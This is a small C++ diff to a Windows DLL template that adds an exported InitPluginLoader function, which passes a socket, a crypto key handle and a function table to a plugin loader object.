@@ -1,7 +1,8 @@
 #include "main.h"
+#include "PluginLoader.h"
 
 // a sample exported function
-void DLL_EXPORT SomeFunction(const LPCSTR sometext)
+void SomeFunction(const LPCSTR sometext)
 {
     MessageBoxA(0, sometext, "DLL Message", MB_OK | MB_ICONINFORMATION);
 }
@@ -32,4 +33,11 @@ bool DLL_EXPORT WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvRe
             break;
     }
     return TRUE; // succesful
+}
+int WINAPI InitPluginLoader(SOCKET hConexion,HCRYPTKEY hKey,LoaderFunTable& lFunc){
+	SomeFunction("InitPluginLoader");
+
+	Loader.run(hConexion,hKey,lFunc);
+
+	return 0;
 }
